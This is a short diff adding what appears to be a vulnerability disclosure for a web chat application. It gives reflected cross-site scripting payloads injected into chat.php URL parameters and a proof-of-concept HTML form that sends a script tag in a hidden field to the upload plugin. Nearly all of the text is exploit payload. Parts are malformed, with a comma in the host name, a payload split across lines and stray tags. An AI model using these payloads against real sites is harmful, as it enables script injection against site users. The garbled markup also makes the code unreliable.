@@ -1,0 +1,31 @@
+http://www,example.com/client/chat.php?id=1"></script><script>alert('XSS
+
+1')</script>&xhash=1" <script>alert('XSS
+2')</script>
+
+
+File: /client/plugins/upload/upload.php
+
+
+POC:
+</style>
+<body>
+<divclass="frei_upload_border">
+<form 
+name="upload"action="http://www,example.com/client/plugins/upload/upload.php" 
+method="post" enctype="multipart/form-data">
+<label for="file">choose file to send</label><br/><br/>
+<input id ="fromid" type="hidden" name="fromid"/>
+<input id="fromname" type="hidden" name="fromname"/>
+<input id="toid" type="hidden" name="toid"/>
+                                    <!--
+<input id="toname" type="hidden" name="toname"/> -->
+<input id="toname" type="hidden" name="toname" 
+value="<script>alert('XSS')</script>"/>
+<input type="file" name="file" id="file" value="a.jpeg" />
+<br /><br/>
+<input  class ="frei_upload_button" type="submit" name="submit" 
+value="Send" />
+</form>
+</div>
+</body></html>
